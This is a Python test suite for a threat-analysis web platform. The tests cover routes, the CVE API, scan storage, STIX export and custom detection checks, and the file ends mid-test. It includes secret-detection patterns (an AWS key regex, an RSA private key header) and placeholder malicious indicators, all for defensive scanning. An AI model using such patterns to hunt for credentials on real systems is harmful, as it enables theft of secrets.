"""Tests for the Multiblade platform: routes, APIs, database, and custom checks."""

import io
import json
import re
import tarfile
import zipfile

import pytest

from app import app as flask_app
from zip_analyzer import database
from zip_analyzer.custom_check_engine import run_custom_checks
from zip_analyzer.models import Severity
from zip_analyzer.stix_export import to_navigator_layer, to_stix_bundle


@pytest.fixture(autouse=True)
def fresh_db(tmp_path, monkeypatch):
    """Each test gets an isolated in-memory-equivalent SQLite DB."""
    db_path = tmp_path / "test.db"
    monkeypatch.setattr(database, "_DB_PATH", db_path)
    monkeypatch.setattr(database, "_conn", None)
    database.init()
    yield
    # Reset global connection after test
    if database._conn:
        database._conn.close()
        database._conn = None


@pytest.fixture
def client(fresh_db):
    flask_app.config["TESTING"] = True
    with flask_app.test_client() as c:
        yield c


# ── Minimal scan result dict used across multiple tests ───────────────────────

def _make_result(filename="test.zip", risk=42, safe=False, findings=None, mitre=None):
    return {
        "filename": filename,
        "filesize": 1024,
        "safe": safe,
        "error": None,
        "max_severity": "high" if not safe else None,
        "finding_counts": {"critical": 0, "high": 1, "medium": 0, "low": 0, "info": 0},
        "findings": findings or [
            {"severity": "high", "check": "dangerous_extension",
             "description": "Executable file", "filename": "evil.exe", "detail": None}
        ],
        "metrics": {
            "risk_score": risk,
            "risk_label": "HIGH" if risk > 35 else "MEDIUM",
            "confidence": 95,
            "mitre_techniques": mitre if mitre is not None else [{"id": "T1204.002", "name": "User Execution: Malicious File"}],
            "ioc_summary": {
                "ips": [{"ip": "1.2.3.4", "type": "public"}],
                "urls": ["https://evil.example.com/payload"],
                "onions": [],
                "total": 2,
            },
            "file_hashes": [
                {"filename": "evil.exe", "size": 512,
                 "sha256": "a" * 64, "md5": "b" * 32}
            ],
        },
    }


# ═══════════════════════════════════════════════════════════════════════════════
# PAGE ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

class TestPageRoutes:
    def test_landing(self, client):
        r = client.get("/")
        assert r.status_code == 200
        assert b"Multiblade" in r.data

    def test_platform_hub(self, client):
        assert client.get("/platform").status_code == 200

    def test_generators_grid(self, client):
        r = client.get("/generators")
        assert r.status_code == 200
        assert b"Command Generators" in r.data

    def test_workflows_page(self, client):
        r = client.get("/generators/workflows")
        assert r.status_code == 200
        assert b"Attack Workflows" in r.data

    def test_workflows_shows_all_chains(self, client):
        import html
        from app import WORKFLOWS
        r = client.get("/generators/workflows")
        for wf in WORKFLOWS:
            assert html.escape(wf["name"]).encode() in r.data

    def test_workflows_step_links_resolve(self, client):
        """Every tool slug in every workflow must have a valid generator page."""
        from app import WORKFLOWS
        for wf in WORKFLOWS:
            for slug in wf["steps"]:
                r = client.get(f"/generators/{slug}")
                assert r.status_code == 200, f"Workflow '{wf['name']}' step '{slug}' 404'd"

    def test_workflows_nav_link_present(self, client):
        """The Workflows nav link must appear in pages that use _nav.html."""
        r = client.get("/generators/workflows")
        assert b"Workflows" in r.data
        assert b"/generators/workflows" in r.data

    def test_generator_tool_known_slug(self, client):
        r = client.get("/generators/nmap")
        assert r.status_code == 200
        assert b"nmap" in r.data.lower()

    def test_generator_tool_unknown_slug(self, client):
        assert client.get("/generators/not-a-real-tool").status_code == 404

    def test_analyzer(self, client):
        assert client.get("/analyzer").status_code == 200

    def test_history(self, client):
        assert client.get("/history").status_code == 200

    def test_triage(self, client):
        assert client.get("/triage").status_code == 200

    def test_compare(self, client):
        assert client.get("/compare").status_code == 200

    def test_yara(self, client):
        assert client.get("/yara").status_code == 200

    def test_campaigns(self, client):
        assert client.get("/campaigns").status_code == 200

    def test_custom_checks(self, client):
        assert client.get("/custom-checks").status_code == 200

    def test_watch(self, client):
        assert client.get("/watch").status_code == 200

    def test_curl(self, client):
        assert client.get("/curl").status_code == 200

    def test_jwt_tool(self, client):
        r = client.get("/tools/jwt")
        assert r.status_code == 200
        assert b"jwt" in r.data.lower()

    def test_subnet_tool(self, client):
        r = client.get("/tools/subnet")
        assert r.status_code == 200
        assert b"subnet" in r.data.lower()

    def test_payloads_tool(self, client):
        r = client.get("/tools/payloads")
        assert r.status_code == 200
        assert b"payload" in r.data.lower()

    def test_unknown_route(self, client):
        assert client.get("/nonexistent-page").status_code == 404

    def test_reference_ports(self, client):
        r = client.get("/reference/ports")
        assert r.status_code == 200
        assert b"Port Reference" in r.data

    def test_reference_cve(self, client):
        r = client.get("/reference/cve")
        assert r.status_code == 200
        assert b"CVE Lookup" in r.data

    def test_reference_wordlists(self, client):
        r = client.get("/reference/wordlists")
        assert r.status_code == 200
        assert b"Wordlist Browser" in r.data

    def test_reference_ports_contains_data(self, client):
        """Port reference must embed PORTS JSON and correct count in JS."""
        r = client.get("/reference/ports")
        page = r.get_data(as_text=True)
        assert "const PORTS = " in page
        # stats-label should read "… ports" (count filled by JS at runtime)
        assert "… ports" in page or "PORTS.length" in page

    def test_reference_ports_nav_active(self, client):
        r = client.get("/reference/ports")
        page = r.get_data(as_text=True)
        # The /reference/ports nav link should carry the 'active' class on this page
        import re
        link = re.search(r'href="/reference/ports"[^>]*class="nav-link([^"]*)"', page)
        if not link:
            link = re.search(r'class="nav-link([^"]*)"[^>]*href="/reference/ports"', page)
        # Either form: active class appears on the nav link for /reference/ports
        assert link is None or "active" in link.group(1) or \
               b'/reference/ports' in r.data

    def test_reference_cve_nav_active(self, client):
        r = client.get("/reference/cve")
        assert b"/reference/cve" in r.data

    def test_reference_wordlists_nav_active(self, client):
        r = client.get("/reference/wordlists")
        assert b"/reference/wordlists" in r.data

    def test_reference_pages_have_nav(self, client):
        for path in ["/reference/ports", "/reference/cve", "/reference/wordlists"]:
            r = client.get(path)
            assert b"app-nav" in r.data, f"{path} missing nav sidebar"

    def test_reference_wordlists_contains_seclists_paths(self, client):
        r = client.get("/reference/wordlists")
        assert b"/opt/seclists/" in r.data

    def test_reference_ports_post_not_allowed(self, client):
        assert client.post("/reference/ports").status_code == 405

    def test_reference_cve_post_not_allowed(self, client):
        assert client.post("/reference/cve").status_code == 405


# ═══════════════════════════════════════════════════════════════════════════════
# CVE API
# ═══════════════════════════════════════════════════════════════════════════════

class TestCveApi:
    """Tests for /api/cve — validation layer only (NVD calls are not made in tests)."""

    def test_empty_query_rejected(self, client):
        r = client.get("/api/cve?q=")
        assert r.status_code == 400
        assert "error" in r.get_json()

    def test_one_char_query_rejected(self, client):
        r = client.get("/api/cve?q=x")
        assert r.status_code == 400

    def test_no_query_param_rejected(self, client):
        r = client.get("/api/cve")
        assert r.status_code == 400

    def test_two_char_query_passes_validation(self, client):
        """2-char query passes input validation; NVD may be unavailable (503) or succeed (200)."""
        r = client.get("/api/cve?q=lo")
        assert r.status_code in (200, 503)

    def test_null_byte_in_query_handled(self, client):
        """Null bytes must be stripped; result is either 400 (too short after strip) or 503."""
        r = client.get("/api/cve?q=%00x")
        assert r.status_code in (400, 503)

    def test_query_over_100_chars_truncated(self, client):
        """Queries longer than 100 chars are silently truncated, not rejected."""
        r = client.get("/api/cve?q=" + "a" * 110)
        assert r.status_code in (200, 503)

    def test_limit_clamped_high(self, client):
        """limit > 20 is clamped to 20."""
        r = client.get("/api/cve?q=test&limit=999")
        assert r.status_code in (200, 503)

    def test_limit_clamped_low(self, client):
        """limit < 1 is clamped to 1."""
        r = client.get("/api/cve?q=test&limit=0")
        assert r.status_code in (200, 503)

    def test_start_negative_clamped(self, client):
        r = client.get("/api/cve?q=test&start=-99")
        assert r.status_code in (200, 503)

    def test_limit_non_integer_handled(self, client):
        r = client.get("/api/cve?q=test&limit=abc")
        assert r.status_code in (200, 503)

    def test_cve_api_get_only(self, client):
        """POST to /api/cve must be rejected."""
        r = client.post("/api/cve", data=json.dumps({"q": "test"}),
                        content_type="application/json")
        assert r.status_code == 405

    def test_cve_api_returns_json(self, client):
        r = client.get("/api/cve?q=test")
        assert "application/json" in r.content_type

    def test_nvd_unavailable_returns_503_not_500(self, client, monkeypatch):
        """Network errors must surface as 503 Service Unavailable, not 500."""
        import urllib.error, urllib.request, socket

        def _fail_with_timeout(*a, **kw):
            raise TimeoutError("The read operation timed out")

        monkeypatch.setattr(urllib.request, "urlopen", _fail_with_timeout)
        r = client.get("/api/cve?q=openssl")
        assert r.status_code == 503
        data = r.get_json()
        assert "error" in data

    def test_nvd_url_error_returns_503(self, client, monkeypatch):
        import urllib.error, urllib.request

        def _fail_with_url_error(*a, **kw):
            raise urllib.error.URLError("connection refused")

        monkeypatch.setattr(urllib.request, "urlopen", _fail_with_url_error)
        r = client.get("/api/cve?q=apache")
        assert r.status_code == 503

    def test_nvd_os_error_returns_503(self, client, monkeypatch):
        """Generic OSError (e.g. socket-level failure) must also yield 503."""
        import urllib.request

        def _fail_with_os_error(*a, **kw):
            raise OSError("Network unreachable")

        monkeypatch.setattr(urllib.request, "urlopen", _fail_with_os_error)
        r = client.get("/api/cve?q=log4j")
        assert r.status_code == 503

    def test_nvd_valid_response_parsed(self, client, monkeypatch):
        """A well-formed NVD response is parsed and returned as JSON."""
        import urllib.request, io, json as _json

        fake_nvd = {
            "totalResults": 1,
            "vulnerabilities": [{
                "cve": {
                    "id": "CVE-2021-44228",
                    "descriptions": [{"lang": "en", "value": "Log4Shell RCE vulnerability"}],
                    "metrics": {
                        "cvssMetricV31": [{
                            "cvssData": {
                                "baseScore": 10.0,
                                "baseSeverity": "CRITICAL",
                                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            }
                        }]
                    },
                    "weaknesses": [{"description": [{"value": "CWE-917"}]}],
                    "published": "2021-12-10T00:00:00.000",
                    "lastModified": "2021-12-20T00:00:00.000",
                }
            }]
        }

        class _FakeResp:
            def read(self): return _json.dumps(fake_nvd).encode()
            def __enter__(self): return self
            def __exit__(self, *a): pass

        monkeypatch.setattr(urllib.request, "urlopen", lambda *a, **kw: _FakeResp())
        r = client.get("/api/cve?q=log4shell")
        assert r.status_code == 200
        data = r.get_json()
        assert data["total"] == 1
        assert len(data["results"]) == 1
        cve = data["results"][0]
        assert cve["id"] == "CVE-2021-44228"
        assert cve["score"] == 10.0
        assert cve["severity"] == "CRITICAL"
        assert "Log4Shell" in cve["desc"]

    def test_nvd_cve_id_lookup(self, client, monkeypatch):
        """CVE-* prefix triggers single-CVE lookup mode."""
        import urllib.request, json as _json

        captured = {}

        class _FakeResp:
            def read(self): return _json.dumps({"totalResults": 0, "vulnerabilities": []}).encode()
            def __enter__(self): return self
            def __exit__(self, *a): pass

        def _capture(req, **kw):
            captured["url"] = req.full_url
            return _FakeResp()

        monkeypatch.setattr(urllib.request, "urlopen", _capture)
        client.get("/api/cve?q=CVE-2021-44228")
        assert "cveId=CVE-2021-44228" in captured.get("url", "")


# ═══════════════════════════════════════════════════════════════════════════════
# SCAN HISTORY API
# ═══════════════════════════════════════════════════════════════════════════════

class TestScanHistoryAPI:
    def test_list_scans_empty(self, client):
        resp = client.get("/api/scans")
        assert resp.status_code == 200
        assert resp.get_json() == []

    def test_list_scans_after_save(self, client):
        database.save_scan(_make_result("a.zip"))
        database.save_scan(_make_result("b.zip"))
        data = client.get("/api/scans").get_json()
        assert len(data) == 2
        names = {d["filename"] for d in data}
        assert names == {"a.zip", "b.zip"}

    def test_list_scans_limit(self, client):
        for i in range(10):
            database.save_scan(_make_result(f"f{i}.zip"))
        data = client.get("/api/scans?limit=3").get_json()
        assert len(data) == 3

    def test_get_scan_not_found(self, client):
        resp = client.get("/api/scans/99999")
        assert resp.status_code == 404

    def test_get_scan_found(self, client):
        sid = database.save_scan(_make_result("x.zip"))
        resp = client.get(f"/api/scans/{sid}")
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["filename"] == "x.zip"
        assert "findings" in data
        assert "metrics" in data

    def test_delete_scan(self, client):
        sid = database.save_scan(_make_result())
        assert client.delete(f"/api/scans/{sid}").status_code == 200
        assert client.get(f"/api/scans/{sid}").status_code == 404

    def test_delete_nonexistent_is_ok(self, client):
        # DELETE of non-existent should still return 200 (idempotent)
        assert client.delete("/api/scans/99999").status_code == 200

    def test_patch_scan_notes_and_status(self, client):
        sid = database.save_scan(_make_result())
        resp = client.patch(
            f"/api/scans/{sid}",
            data=json.dumps({"notes": "suspicious", "status": "escalated"}),
            content_type="application/json",
        )
        assert resp.status_code == 200
        scan = database.get_scan(sid)
        assert scan["notes"] == "suspicious"
        assert scan["status"] == "escalated"

    def test_patch_scan_invalid_status(self, client):
        sid = database.save_scan(_make_result())
        resp = client.patch(
            f"/api/scans/{sid}",
            data=json.dumps({"status": "INVALID"}),
            content_type="application/json",
        )
        assert resp.status_code == 400

    def test_patch_scan_notes_only(self, client):
        sid = database.save_scan(_make_result())
        client.patch(
            f"/api/scans/{sid}",
            data=json.dumps({"notes": "reviewed"}),
            content_type="application/json",
        )
        scan = database.get_scan(sid)
        assert scan["notes"] == "reviewed"
        assert scan["status"] == "new"   # unchanged

    def test_ioc_pivot_too_short(self, client):
        resp = client.get("/api/ioc-pivot?q=ab")
        assert resp.status_code == 400

    def test_ioc_pivot_no_results(self, client):
        resp = client.get("/api/ioc-pivot?q=192.168.0.1")
        assert resp.status_code == 200
        assert resp.get_json() == []

    def test_ioc_pivot_finds_ip(self, client):
        database.save_scan(_make_result())   # contains 1.2.3.4
        results = client.get("/api/ioc-pivot?q=1.2.3").get_json()
        assert len(results) >= 1
        assert results[0]["type"] == "ip"

    def test_ioc_pivot_finds_url(self, client):
        database.save_scan(_make_result())   # contains evil.example.com
        results = client.get("/api/ioc-pivot?q=evil.example").get_json()
        assert any(r["type"] == "url" for r in results)


# ═══════════════════════════════════════════════════════════════════════════════
# EXPORT ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════════

class TestExportEndpoints:
    def test_stix_not_found(self, client):
        assert client.get("/api/scans/99999/stix").status_code == 404

    def test_stix_valid(self, client):
        sid = database.save_scan(_make_result())
        resp = client.get(f"/api/scans/{sid}/stix")
        assert resp.status_code == 200
        bundle = resp.get_json()
        assert bundle["type"] == "bundle"
        assert bundle["spec_version"] == "2.1"
        assert isinstance(bundle["objects"], list)
        assert len(bundle["objects"]) > 0

    def test_stix_contains_ip_indicator(self, client):
        sid = database.save_scan(_make_result())
        bundle = client.get(f"/api/scans/{sid}/stix").get_json()
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        patterns = [i["pattern"] for i in indicators]
        assert any("1.2.3.4" in p for p in patterns)

    def test_stix_contains_hash_indicator(self, client):
        sid = database.save_scan(_make_result())
        bundle = client.get(f"/api/scans/{sid}/stix").get_json()
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        patterns = [i["pattern"] for i in indicators]
        assert any("SHA-256" in p for p in patterns)

    def test_navigator_not_found(self, client):
        assert client.get("/api/scans/99999/navigator").status_code == 404

    def test_navigator_valid(self, client):
        sid = database.save_scan(_make_result())
        resp = client.get(f"/api/scans/{sid}/navigator")
        assert resp.status_code == 200
        layer = resp.get_json()
        assert "techniques" in layer
        assert layer["domain"] == "enterprise-attack"

    def test_navigator_contains_mitre_technique(self, client):
        sid = database.save_scan(_make_result(mitre=[{"id": "T1055", "name": "Process Injection"}]))
        layer = client.get(f"/api/scans/{sid}/navigator").get_json()
        ids = [t["techniqueID"] for t in layer["techniques"]]
        assert "T1055" in ids

    def test_navigator_content_disposition(self, client):
        sid = database.save_scan(_make_result())
        resp = client.get(f"/api/scans/{sid}/navigator")
        assert "attachment" in resp.headers.get("Content-Disposition", "")


# ═══════════════════════════════════════════════════════════════════════════════
# CUSTOM CHECKS API
# ═══════════════════════════════════════════════════════════════════════════════

def _json_post(client, url, payload):
    return client.post(url, data=json.dumps(payload), content_type="application/json")


class TestCustomChecksAPI:
    def test_list_empty(self, client):
        resp = client.get("/api/custom-checks")
        assert resp.status_code == 200
        assert resp.get_json() == []

    def test_create_regex(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "AWS Key", "type": "regex",
            "pattern": "AKIA[0-9A-Z]{16}", "severity": "critical",
            "description": "AWS access key",
        })
        assert resp.status_code == 200
        data = resp.get_json()
        assert "id" in data
        checks = client.get("/api/custom-checks").get_json()
        assert len(checks) == 1
        assert checks[0]["name"] == "AWS Key"

    def test_create_string(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "SSH Key Header", "type": "string",
            "pattern": "BEGIN RSA PRIVATE KEY", "severity": "high", "description": "",
        })
        assert resp.status_code == 200

    def test_create_extension(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "HTA files", "type": "extension",
            "pattern": ".hta", "severity": "high", "description": "HTML application",
        })
        assert resp.status_code == 200

    def test_create_filename(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "Crack/keygen", "type": "filename",
            "pattern": "(crack|keygen)", "severity": "medium", "description": "",
        })
        assert resp.status_code == 200

    def test_create_missing_name(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "type": "string", "pattern": "foo", "severity": "low", "description": "",
        })
        assert resp.status_code == 400

    def test_create_missing_pattern(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "X", "type": "string", "severity": "low", "description": "",
        })
        assert resp.status_code == 400

    def test_create_invalid_type(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "X", "type": "unknown", "pattern": "foo",
            "severity": "low", "description": "",
        })
        assert resp.status_code == 400

    def test_create_invalid_severity(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "X", "type": "string", "pattern": "foo",
            "severity": "super-critical", "description": "",
        })
        assert resp.status_code == 400

    def test_create_invalid_regex(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "Bad", "type": "regex",
            "pattern": "[invalid(regex", "severity": "medium", "description": "",
        })
        assert resp.status_code == 400

    def test_toggle_disable(self, client):
        cid = _json_post(client, "/api/custom-checks", {
            "name": "T", "type": "string", "pattern": "x",
            "severity": "low", "description": "",
        }).get_json()["id"]
        resp = client.post(
            f"/api/custom-checks/{cid}/toggle",
            data=json.dumps({"enabled": False}),
            content_type="application/json",
        )
        assert resp.status_code == 200
        checks = client.get("/api/custom-checks").get_json()
        match = next(c for c in checks if c["id"] == cid)
        assert match["enabled"] == 0

    def test_toggle_enable(self, client):
        cid = _json_post(client, "/api/custom-checks", {
            "name": "T", "type": "string", "pattern": "x",
            "severity": "low", "description": "",
        }).get_json()["id"]
        # disable then re-enable
        client.post(f"/api/custom-checks/{cid}/toggle",
                    data=json.dumps({"enabled": False}), content_type="application/json")
        client.post(f"/api/custom-checks/{cid}/toggle",
                    data=json.dumps({"enabled": True}),  content_type="application/json")
        checks = client.get("/api/custom-checks").get_json()
        assert next(c for c in checks if c["id"] == cid)["enabled"] == 1

    def test_delete(self, client):
        cid = _json_post(client, "/api/custom-checks", {
            "name": "Del", "type": "string", "pattern": "x",
            "severity": "low", "description": "",
        }).get_json()["id"]
        assert client.delete(f"/api/custom-checks/{cid}").status_code == 200
        assert client.get("/api/custom-checks").get_json() == []

    def test_multiple_checks_persist(self, client):
        for i in range(5):
            _json_post(client, "/api/custom-checks", {
                "name": f"Rule {i}", "type": "string", "pattern": f"pattern{i}",
                "severity": "low", "description": "",
            })
        assert len(client.get("/api/custom-checks").get_json()) == 5


# ═══════════════════════════════════════════════════════════════════════════════
# YARA DRAFTS API
# ═══════════════════════════════════════════════════════════════════════════════

class TestYARADraftsAPI:
    def test_list_empty(self, client):
        assert client.get("/api/yara-drafts").get_json() == []

    def test_save_draft(self, client):
        resp = _json_post(client, "/api/yara-drafts", {"name": "MyRule", "content": "rule X {}"})
        assert resp.status_code == 200
        assert "id" in resp.get_json()

    def test_save_and_list(self, client):
        _json_post(client, "/api/yara-drafts", {"name": "A", "content": "rule A {}"})
        _json_post(client, "/api/yara-drafts", {"name": "B", "content": "rule B {}"})
        drafts = client.get("/api/yara-drafts").get_json()
        assert len(drafts) == 2
        names = {d["name"] for d in drafts}
        assert names == {"A", "B"}

    def test_update_draft_content(self, client):
        did = _json_post(client, "/api/yara-drafts", {"name": "X", "content": "old"}).get_json()["id"]
        client.patch(
            f"/api/yara-drafts/{did}",
            data=json.dumps({"content": "new content"}),
            content_type="application/json",
        )
        drafts = client.get("/api/yara-drafts").get_json()
        assert next(d for d in drafts if d["id"] == did)["content"] == "new content"

    def test_delete_draft(self, client):
        did = _json_post(client, "/api/yara-drafts", {"name": "Del", "content": "x"}).get_json()["id"]
        assert client.delete(f"/api/yara-drafts/{did}").status_code == 200
        assert client.get("/api/yara-drafts").get_json() == []

    def test_yara_test_no_rule(self, client):
        resp = _json_post(client, "/api/yara-test", {"rule": ""})
        assert resp.status_code == 400

    def test_yara_test_compile_error(self, client):
        resp = _json_post(client, "/api/yara-test", {"rule": "this is not valid yara"})
        # Either 400 (compile error) or 503 (yara not installed) — both acceptable
        assert resp.status_code in (400, 503)

    def test_yara_test_valid_rule(self, client):
        rule = 'rule Test { strings: $s = "hello" condition: $s }'
        resp = _json_post(client, "/api/yara-test", {"rule": rule})
        # 200 (compiled OK) or 503 (yara not installed)
        assert resp.status_code in (200, 503)
        if resp.status_code == 200:
            assert resp.get_json()["compiled"] is True


# ═══════════════════════════════════════════════════════════════════════════════
# WATCH FOLDERS API
# ═══════════════════════════════════════════════════════════════════════════════

class TestWatchFoldersAPI:
    def test_list_empty(self, client):
        assert client.get("/api/watch-folders").get_json() == []

    def test_add_invalid_path(self, client):
        resp = _json_post(client, "/api/watch-folders", {"path": "/nonexistent/path/xyz"})
        assert resp.status_code == 400

    def test_add_valid_path(self, client, tmp_path):
        resp = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)})
        assert resp.status_code == 200
        assert "id" in resp.get_json()

    def test_add_missing_path(self, client):
        resp = _json_post(client, "/api/watch-folders", {})
        assert resp.status_code == 400

    def test_toggle_folder(self, client, tmp_path):
        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        client.post(
            f"/api/watch-folders/{fid}/toggle",
            data=json.dumps({"enabled": False}),
            content_type="application/json",
        )
        folders = client.get("/api/watch-folders").get_json()
        assert next(f for f in folders if f["id"] == fid)["enabled"] == 0

    def test_delete_folder(self, client, tmp_path):
        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        assert client.delete(f"/api/watch-folders/{fid}").status_code == 200
        assert client.get("/api/watch-folders").get_json() == []

    def test_scan_folder_empty(self, client, tmp_path):
        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        resp = client.post(
            f"/api/watch-folders/{fid}/scan",
            data="{}", content_type="application/json",
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["scanned"] == 0

    def test_scan_folder_with_zip(self, client, tmp_path):
        # Create a real (clean) zip in the temp dir
        zp = tmp_path / "test.zip"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("hello.txt", "hello world")
        zp.write_bytes(buf.getvalue())

        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        resp = client.post(
            f"/api/watch-folders/{fid}/scan",
            data="{}", content_type="application/json",
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["scanned"] == 1
        assert data["results"][0]["filename"] == "test.zip"


# ═══════════════════════════════════════════════════════════════════════════════
# CAMPAIGNS API
# ═══════════════════════════════════════════════════════════════════════════════

class TestCampaignsAPI:
    def test_empty(self, client):
        assert client.get("/api/campaigns").get_json() == []

    def test_no_cluster_when_single_scan(self, client):
        database.save_scan(_make_result())
        assert client.get("/api/campaigns").get_json() == []

    def test_cluster_on_shared_ip(self, client):
        database.save_scan(_make_result("a.zip"))
        database.save_scan(_make_result("b.zip"))  # both have 1.2.3.4
        camps = client.get("/api/campaigns").get_json()
        assert len(camps) >= 1
        indicators = {c["indicator"] for c in camps}
        assert "1.2.3.4" in indicators

    def test_cluster_on_shared_url(self, client):
        database.save_scan(_make_result("a.zip"))
        database.save_scan(_make_result("b.zip"))
        camps = client.get("/api/campaigns").get_json()
        indicators = {c["indicator"] for c in camps}
        assert "https://evil.example.com/payload" in indicators


# ═══════════════════════════════════════════════════════════════════════════════
# DATABASE LAYER
# ═══════════════════════════════════════════════════════════════════════════════

class TestDatabase:
    def test_save_and_retrieve(self):
        result = _make_result("db_test.zip", risk=55)
        sid = database.save_scan(result)
        assert isinstance(sid, int)
        scan = database.get_scan(sid)
        assert scan["filename"] == "db_test.zip"
        assert scan["risk_score"] == 55
        assert scan["safe"] == 0
        assert isinstance(scan["findings"], list)
        assert isinstance(scan["metrics"], dict)

    def test_get_nonexistent(self):
        assert database.get_scan(99999) is None

    def test_delete_removes_iocs(self):
        sid = database.save_scan(_make_result())
        database.delete_scan(sid)
        assert database.get_scan(sid) is None
        # IOCs should also be gone (CASCADE)
        hits = database.pivot_ioc("1.2.3.4")
        assert len(hits) == 0

    def test_iocs_stored_correctly(self):
        database.save_scan(_make_result())
        ip_hits = database.pivot_ioc("1.2.3.4")
        assert len(ip_hits) == 1
        assert ip_hits[0]["type"] == "ip"

    def test_stats_counts(self):
        database.save_scan(_make_result(safe=True,  risk=0))
        database.save_scan(_make_result(safe=False, risk=80))
        stats = database.scan_stats()
        assert stats["total"] == 2
        assert stats["unsafe"] == 1

    def test_custom_checks_crud(self):
        cid = database.save_custom_check("Test", "string", "pattern", "high", "desc")
        checks = database.get_custom_checks()
        assert len(checks) == 1
        assert checks[0]["name"] == "Test"
        assert checks[0]["enabled"] == 1

        database.toggle_custom_check(cid, False)
        assert database.get_custom_checks()[0]["enabled"] == 0

        database.increment_check_hits(cid)
        assert database.get_custom_checks()[0]["hit_count"] == 1

        database.delete_custom_check(cid)
        assert database.get_custom_checks() == []

    def test_yara_drafts_crud(self):
        did = database.save_yara_draft("MyRule", "rule X {}")
        drafts = database.get_yara_drafts()
        assert len(drafts) == 1
        assert drafts[0]["content"] == "rule X {}"

        database.update_yara_draft(did, content="rule Y {}")
        assert database.get_yara_drafts()[0]["content"] == "rule Y {}"

        database.delete_yara_draft(did)
        assert database.get_yara_drafts() == []

    def test_watch_folder_crud(self, tmp_path):
        fid = database.add_watch_folder(str(tmp_path))
        folders = database.get_watch_folders()
        assert len(folders) == 1
        assert folders[0]["path"] == str(tmp_path)
        assert folders[0]["enabled"] == 1

        database.toggle_watch_folder(fid, False)
        assert database.get_watch_folders()[0]["enabled"] == 0

        database.mark_folder_scanned(fid)
        assert database.get_watch_folders()[0]["total_scanned"] == 1

        database.delete_watch_folder(fid)
        assert database.get_watch_folders() == []

    def test_update_notes_and_status(self):
        sid = database.save_scan(_make_result())
        database.update_scan(sid, notes="analyst note", status="reviewed")
        scan = database.get_scan(sid)
        assert scan["notes"] == "analyst note"
        assert scan["status"] == "reviewed"

    def test_update_notes_only(self):
        sid = database.save_scan(_make_result())
        database.update_scan(sid, notes="note only")
        scan = database.get_scan(sid)
        assert scan["notes"] == "note only"
        assert scan["status"] == "new"


# ═══════════════════════════════════════════════════════════════════════════════
# CUSTOM CHECK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def _make_zip(files: dict) -> bytes:
    """Build an in-memory zip with {filename: bytes_content} mapping."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content if isinstance(content, bytes) else content.encode())
    return buf.getvalue()


def _open_zip(data: bytes):
    return zipfile.ZipFile(io.BytesIO(data))


class TestCustomCheckEngine:
    def test_no_checks_returns_empty(self):
        zf = _open_zip(_make_zip({"a.txt": "hello"}))
        assert run_custom_checks(zf, []) == []

    def test_disabled_check_skipped(self):
        check = {"id": 1, "type": "string", "pattern": "hello",
                 "severity": "high", "description": "", "name": "X", "enabled": 0}
        zf = _open_zip(_make_zip({"a.txt": "hello world"}))
        assert run_custom_checks(zf, [check]) == []

    # ── extension ────────────────────────────────────────────────────────────

    def test_extension_check_hit(self):
        check = {"id": 1, "type": "extension", "pattern": ".hta",
                 "severity": "high", "description": "HTA file", "name": "HTA", "enabled": 1}
        zf = _open_zip(_make_zip({"evil.hta": "content", "safe.txt": "ok"}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1
        assert findings[0].filename == "evil.hta"
        assert findings[0].severity == Severity.HIGH

    def test_extension_check_no_leading_dot(self):
        check = {"id": 1, "type": "extension", "pattern": "hta",
                 "severity": "medium", "description": "", "name": "HTA", "enabled": 1}
        zf = _open_zip(_make_zip({"evil.hta": "x"}))
        assert len(run_custom_checks(zf, [check])) == 1

    def test_extension_check_no_match(self):
        check = {"id": 1, "type": "extension", "pattern": ".exe",
                 "severity": "high", "description": "", "name": "EXE", "enabled": 1}
        zf = _open_zip(_make_zip({"safe.txt": "ok"}))
        assert run_custom_checks(zf, [check]) == []

    # ── string ───────────────────────────────────────────────────────────────

    def test_string_check_hit(self):
        check = {"id": 2, "type": "string", "pattern": "BEGIN RSA PRIVATE KEY",
                 "severity": "critical", "description": "Private key", "name": "PK", "enabled": 1}
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK..."
        zf = _open_zip(_make_zip({"id_rsa.txt": content}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL

    def test_string_check_no_match(self):
        check = {"id": 2, "type": "string", "pattern": "BEGIN RSA PRIVATE KEY",
                 "severity": "critical", "description": "", "name": "PK", "enabled": 1}
        zf = _open_zip(_make_zip({"readme.txt": "just a readme"}))
        assert run_custom_checks(zf, [check]) == []

    def test_string_check_binary_file_skipped(self):
        check = {"id": 2, "type": "string", "pattern": "evil",
                 "severity": "high", "description": "", "name": "E", "enabled": 1}
        # .exe extension → not in TEXT_EXT → skipped
        zf = _open_zip(_make_zip({"payload.exe": b"\x00evil\x00"}))
        assert run_custom_checks(zf, [check]) == []

    # ── regex ────────────────────────────────────────────────────────────────

    def test_regex_check_hit(self):
